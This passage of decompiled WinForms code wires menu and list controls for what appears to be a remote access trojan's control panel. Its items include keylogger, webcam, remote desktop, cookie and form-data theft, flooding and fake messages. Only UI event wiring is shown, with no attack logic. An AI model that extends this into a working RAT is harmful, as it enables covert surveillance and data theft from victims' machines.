      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ShowToolStripMenuItem4_Click);
        if (this._ShowToolStripMenuItem4 != null)
          this._ShowToolStripMenuItem4.Click -= eventHandler;
        this._ShowToolStripMenuItem4 = value;
        if (this._ShowToolStripMenuItem4 == null)
          return;
        this._ShowToolStripMenuItem4.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HideToolStripMenuItem4
    {
      [DebuggerNonUserCode] get => this._HideToolStripMenuItem4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HideToolStripMenuItem4_Click);
        if (this._HideToolStripMenuItem4 != null)
          this._HideToolStripMenuItem4.Click -= eventHandler;
        this._HideToolStripMenuItem4 = value;
        if (this._HideToolStripMenuItem4 == null)
          return;
        this._HideToolStripMenuItem4.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem PrintToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._PrintToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PrintToolStripMenuItem_Click);
        if (this._PrintToolStripMenuItem != null)
          this._PrintToolStripMenuItem.Click -= eventHandler;
        this._PrintToolStripMenuItem = value;
        if (this._PrintToolStripMenuItem == null)
          return;
        this._PrintToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SwapMouseToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SwapMouseToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._SwapMouseToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem LeftToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._LeftToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.LeftToolStripMenuItem_Click);
        if (this._LeftToolStripMenuItem != null)
          this._LeftToolStripMenuItem.Click -= eventHandler;
        this._LeftToolStripMenuItem = value;
        if (this._LeftToolStripMenuItem == null)
          return;
        this._LeftToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RightToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RightToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RightToolStripMenuItem_Click);
        if (this._RightToolStripMenuItem != null)
          this._RightToolStripMenuItem.Click -= eventHandler;
        this._RightToolStripMenuItem = value;
        if (this._RightToolStripMenuItem == null)
          return;
        this._RightToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ClipboardToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ClipboardToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ClipboardToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem LockToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._LockToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.LockToolStripMenuItem1_Click);
        if (this._LockToolStripMenuItem1 != null)
          this._LockToolStripMenuItem1.Click -= eventHandler;
        this._LockToolStripMenuItem1 = value;
        if (this._LockToolStripMenuItem1 == null)
          return;
        this._LockToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem InlockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._InlockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.InlockToolStripMenuItem_Click);
        if (this._InlockToolStripMenuItem != null)
          this._InlockToolStripMenuItem.Click -= eventHandler;
        this._InlockToolStripMenuItem = value;
        if (this._InlockToolStripMenuItem == null)
          return;
        this._InlockToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CapsLockToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CapsLockToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CapsLockToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem OnToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._OnToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OnToolStripMenuItem_Click);
        if (this._OnToolStripMenuItem != null)
          this._OnToolStripMenuItem.Click -= eventHandler;
        this._OnToolStripMenuItem = value;
        if (this._OnToolStripMenuItem == null)
          return;
        this._OnToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem TurnOffToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._TurnOffToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOffToolStripMenuItem1_Click);
        if (this._TurnOffToolStripMenuItem1 != null)
          this._TurnOffToolStripMenuItem1.Click -= eventHandler;
        this._TurnOffToolStripMenuItem1 = value;
        if (this._TurnOffToolStripMenuItem1 == null)
          return;
        this._TurnOffToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem FakeMessageToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FakeMessageToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.FakeMessageToolStripMenuItem_Click);
        if (this._FakeMessageToolStripMenuItem != null)
          this._FakeMessageToolStripMenuItem.Click -= eventHandler;
        this._FakeMessageToolStripMenuItem = value;
        if (this._FakeMessageToolStripMenuItem == null)
          return;
        this._FakeMessageToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HidenFilesToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._HidenFilesToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._HidenFilesToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem EnabledToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._EnabledToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EnabledToolStripMenuItem_Click);
        if (this._EnabledToolStripMenuItem != null)
          this._EnabledToolStripMenuItem.Click -= eventHandler;
        this._EnabledToolStripMenuItem = value;
        if (this._EnabledToolStripMenuItem == null)
          return;
        this._EnabledToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DisabledToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DisabledToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DisabledToolStripMenuItem_Click);
        if (this._DisabledToolStripMenuItem != null)
          this._DisabledToolStripMenuItem.Click -= eventHandler;
        this._DisabledToolStripMenuItem = value;
        if (this._DisabledToolStripMenuItem == null)
          return;
        this._DisabledToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual NotifyIcon icon
    {
      [DebuggerNonUserCode] get => this._icon;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.icon_MouseDoubleClick);
        if (this._icon != null)
          this._icon.MouseDoubleClick -= mouseEventHandler;
        this._icon = value;
        if (this._icon == null)
          return;
        this._icon.MouseDoubleClick += mouseEventHandler;
      }
    }

    internal virtual ToolStripMenuItem RemoteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RemoteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._RemoteToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem DesktopToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._DesktopToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DesktopToolStripMenuItem1_Click);
        if (this._DesktopToolStripMenuItem1 != null)
          this._DesktopToolStripMenuItem1.Click -= eventHandler;
        this._DesktopToolStripMenuItem1 = value;
        if (this._DesktopToolStripMenuItem1 == null)
          return;
        this._DesktopToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ProcessManagerToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ProcessManagerToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ProcessManagerToolStripMenuItem_Click);
        if (this._ProcessManagerToolStripMenuItem != null)
          this._ProcessManagerToolStripMenuItem.Click -= eventHandler;
        this._ProcessManagerToolStripMenuItem = value;
        if (this._ProcessManagerToolStripMenuItem == null)
          return;
        this._ProcessManagerToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ListView ListView1
    {
      [DebuggerNonUserCode] get => this._ListView1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ListView1_SelectedIndexChanged);
        if (this._ListView1 != null)
          this._ListView1.SelectedIndexChanged -= eventHandler;
        this._ListView1 = value;
        if (this._ListView1 == null)
          return;
        this._ListView1.SelectedIndexChanged += eventHandler;
      }
    }

    internal virtual ColumnHeader ColumnHeader1
    {
      [DebuggerNonUserCode] get => this._ColumnHeader1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader1 = value;
    }

    internal virtual ColumnHeader ColumnHeader2
    {
      [DebuggerNonUserCode] get => this._ColumnHeader2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader2 = value;
    }

    internal virtual ColumnHeader ColumnHeader3
    {
      [DebuggerNonUserCode] get => this._ColumnHeader3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader3 = value;
    }

    internal virtual ColumnHeader ColumnHeader4
    {
      [DebuggerNonUserCode] get => this._ColumnHeader4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader4 = value;
    }

    internal virtual Label Label4
    {
      [DebuggerNonUserCode] get => this._Label4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label4 = value;
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label Label3
    {
      [DebuggerNonUserCode] get => this._Label3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click_1);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    internal virtual Label Label2
    {
      [DebuggerNonUserCode] get => this._Label2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click_1);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual StatusStrip notify
    {
      [DebuggerNonUserCode] get => this._notify;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ToolStripItemClickedEventHandler clickedEventHandler = new ToolStripItemClickedEventHandler(this.notify_ItemClicked);
        if (this._notify != null)
          this._notify.ItemClicked -= clickedEventHandler;
        this._notify = value;
        if (this._notify == null)
          return;
        this._notify.ItemClicked += clickedEventHandler;
      }
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel1
    {
      [DebuggerNonUserCode] get => this._ToolStripStatusLabel1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel1 = value;
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel3
    {
      [DebuggerNonUserCode] get => this._ToolStripStatusLabel3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel3 = value;
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel2
    {
      [DebuggerNonUserCode] get => this._ToolStripStatusLabel2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel2 = value;
    }

    internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._KeyloggerToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.KeyloggerToolStripMenuItem_Click);
        if (this._KeyloggerToolStripMenuItem != null)
          this._KeyloggerToolStripMenuItem.Click -= eventHandler;
        this._KeyloggerToolStripMenuItem = value;
        if (this._KeyloggerToolStripMenuItem == null)
          return;
        this._KeyloggerToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem FlipScreenToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FlipScreenToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._FlipScreenToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem TurnOnToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._TurnOnToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOnToolStripMenuItem1_Click);
        if (this._TurnOnToolStripMenuItem1 != null)
          this._TurnOnToolStripMenuItem1.Click -= eventHandler;
        this._TurnOnToolStripMenuItem1 = value;
        if (this._TurnOnToolStripMenuItem1 == null)
          return;
        this._TurnOnToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem TurnOffToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._TurnOffToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOffToolStripMenuItem2_Click);
        if (this._TurnOffToolStripMenuItem2 != null)
          this._TurnOffToolStripMenuItem2.Click -= eventHandler;
        this._TurnOffToolStripMenuItem2 = value;
        if (this._TurnOffToolStripMenuItem2 == null)
          return;
        this._TurnOffToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ColumnHeader ColumnHeader5
    {
      [DebuggerNonUserCode] get => this._ColumnHeader5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader5 = value;
    }

    internal virtual ColumnHeader ColumnHeader6
    {
      [DebuggerNonUserCode] get => this._ColumnHeader6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader6 = value;
    }

    internal virtual Label Label5
    {
      [DebuggerNonUserCode] get => this._Label5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label5 = value;
    }

    internal virtual Label Label6
    {
      [DebuggerNonUserCode] get => this._Label6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label6 = value;
    }

    internal virtual ImageList countryflag
    {
      [DebuggerNonUserCode] get => this._countryflag;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._countryflag = value;
    }

    internal virtual ToolStripMenuItem GetFlagToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._GetFlagToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.GetFlagToolStripMenuItem_Click);
        if (this._GetFlagToolStripMenuItem != null)
          this._GetFlagToolStripMenuItem.Click -= eventHandler;
        this._GetFlagToolStripMenuItem = value;
        if (this._GetFlagToolStripMenuItem == null)
          return;
        this._GetFlagToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem OtherToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._OtherToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._OtherToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem FloodToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FloodToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.FloodToolStripMenuItem_Click);
        if (this._FloodToolStripMenuItem != null)
          this._FloodToolStripMenuItem.Click -= eventHandler;
        this._FloodToolStripMenuItem = value;
        if (this._FloodToolStripMenuItem == null)
          return;
        this._FloodToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HideShowToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._HideShowToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._HideShowToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem CountryToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CountryToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CountryToolStripMenuItem_Click);
        if (this._CountryToolStripMenuItem != null)
          this._CountryToolStripMenuItem.Click -= eventHandler;
        this._CountryToolStripMenuItem = value;
        if (this._CountryToolStripMenuItem == null)
          return;
        this._CountryToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem OSToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._OSToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OSToolStripMenuItem_Click);
        if (this._OSToolStripMenuItem != null)
          this._OSToolStripMenuItem.Click -= eventHandler;
        this._OSToolStripMenuItem = value;
        if (this._OSToolStripMenuItem == null)
          return;
        this._OSToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem IPToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._IPToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.IPToolStripMenuItem_Click);
        if (this._IPToolStripMenuItem != null)
          this._IPToolStripMenuItem.Click -= eventHandler;
        this._IPToolStripMenuItem = value;
        if (this._IPToolStripMenuItem == null)
          return;
        this._IPToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CountryToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._CountryToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CountryToolStripMenuItem1_Click);
        if (this._CountryToolStripMenuItem1 != null)
          this._CountryToolStripMenuItem1.Click -= eventHandler;
        this._CountryToolStripMenuItem1 = value;
        if (this._CountryToolStripMenuItem1 == null)
          return;
        this._CountryToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem CPUToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CPUToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CPUToolStripMenuItem_Click);
        if (this._CPUToolStripMenuItem != null)
          this._CPUToolStripMenuItem.Click -= eventHandler;
        this._CPUToolStripMenuItem = value;
        if (this._CPUToolStripMenuItem == null)
          return;
        this._CPUToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RAMToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RAMToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RAMToolStripMenuItem_Click);
        if (this._RAMToolStripMenuItem != null)
          this._RAMToolStripMenuItem.Click -= eventHandler;
        this._RAMToolStripMenuItem = value;
        if (this._RAMToolStripMenuItem == null)
          return;
        this._RAMToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem AboutToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._AboutToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AboutToolStripMenuItem_Click);
        if (this._AboutToolStripMenuItem != null)
          this._AboutToolStripMenuItem.Click -= eventHandler;
        this._AboutToolStripMenuItem = value;
        if (this._AboutToolStripMenuItem == null)
          return;
        this._AboutToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ChatToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ChatToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ChatToolStripMenuItem_Click);
        if (this._ChatToolStripMenuItem != null)
          this._ChatToolStripMenuItem.Click -= eventHandler;
        this._ChatToolStripMenuItem = value;
        if (this._ChatToolStripMenuItem == null)
          return;
        this._ChatToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem WebcamToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._WebcamToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.WebcamToolStripMenuItem_Click);
        if (this._WebcamToolStripMenuItem != null)
          this._WebcamToolStripMenuItem.Click -= eventHandler;
        this._WebcamToolStripMenuItem = value;
        if (this._WebcamToolStripMenuItem == null)
          return;
        this._WebcamToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ScreenSaverToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ScreenSaverToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ScreenSaverToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem TurnOnToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._TurnOnToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOnToolStripMenuItem2_Click);
        if (this._TurnOnToolStripMenuItem2 != null)
          this._TurnOnToolStripMenuItem2.Click -= eventHandler;
        this._TurnOnToolStripMenuItem2 = value;
        if (this._TurnOnToolStripMenuItem2 == null)
          return;
        this._TurnOnToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem TurnOffToolStripMenuItem3
    {
      [DebuggerNonUserCode] get => this._TurnOffToolStripMenuItem3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TurnOffToolStripMenuItem3_Click);
        if (this._TurnOffToolStripMenuItem3 != null)
          this._TurnOffToolStripMenuItem3.Click -= eventHandler;
        this._TurnOffToolStripMenuItem3 = value;
        if (this._TurnOffToolStripMenuItem3 == null)
          return;
        this._TurnOffToolStripMenuItem3.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._ToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
        if (this._ToolStripMenuItem1 != null)
          this._ToolStripMenuItem1.Click -= eventHandler;
        this._ToolStripMenuItem1 = value;
        if (this._ToolStripMenuItem1 == null)
          return;
        this._ToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem InstalledSoftwareToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._InstalledSoftwareToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.InstalledSoftwareToolStripMenuItem_Click);
        if (this._InstalledSoftwareToolStripMenuItem != null)
          this._InstalledSoftwareToolStripMenuItem.Click -= eventHandler;
        this._InstalledSoftwareToolStripMenuItem = value;
        if (this._InstalledSoftwareToolStripMenuItem == null)
          return;
        this._InstalledSoftwareToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ClickerToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ClickerToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ClickerToolStripMenuItem_Click);
        if (this._ClickerToolStripMenuItem != null)
          this._ClickerToolStripMenuItem.Click -= eventHandler;
        this._ClickerToolStripMenuItem = value;
        if (this._ClickerToolStripMenuItem == null)
          return;
        this._ClickerToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ToolStripMenuItem2
    {
      [DebuggerNonUserCode] get => this._ToolStripMenuItem2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem2_Click);
        if (this._ToolStripMenuItem2 != null)
          this._ToolStripMenuItem2.Click -= eventHandler;
        this._ToolStripMenuItem2 = value;
        if (this._ToolStripMenuItem2 == null)
          return;
        this._ToolStripMenuItem2.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem IEClearToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._IEClearToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._IEClearToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem CookiesToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._CookiesToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CookiesToolStripMenuItem_Click);
        if (this._CookiesToolStripMenuItem != null)
          this._CookiesToolStripMenuItem.Click -= eventHandler;
        this._CookiesToolStripMenuItem = value;
        if (this._CookiesToolStripMenuItem == null)
          return;
        this._CookiesToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HistoryToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._HistoryToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HistoryToolStripMenuItem_Click);
        if (this._HistoryToolStripMenuItem != null)
          this._HistoryToolStripMenuItem.Click -= eventHandler;
        this._HistoryToolStripMenuItem = value;
        if (this._HistoryToolStripMenuItem == null)
          return;
        this._HistoryToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem FormDataToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._FormDataToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.FormDataToolStripMenuItem_Click);
        if (this._FormDataToolStripMenuItem != null)
          this._FormDataToolStripMenuItem.Click -= eventHandler;
        this._FormDataToolStripMenuItem = value;
        if (this._FormDataToolStripMenuItem == null)
          return;
        this._FormDataToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem TempFilesToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._TempFilesToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TempFilesToolStripMenuItem_Click);
        if (this._TempFilesToolStripMenuItem != null)
          this._TempFilesToolStripMenuItem.Click -= eventHandler;
        this._TempFilesToolStripMenuItem = value;
        if (this._TempFilesToolStripMenuItem == null)
          return;
        this._TempFilesToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ResponseToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ResponseToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ResponseToolStripMenuItem_Click);
        if (this._ResponseToolStripMenuItem != null)
          this._ResponseToolStripMenuItem.Click -= eventHandler;
        this._ResponseToolStripMenuItem = value;
        if (this._ResponseToolStripMenuItem == null)
          return;
        this._ResponseToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ToolStripMenuItem3
    {
      [DebuggerNonUserCode] get => this._ToolStripMenuItem3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
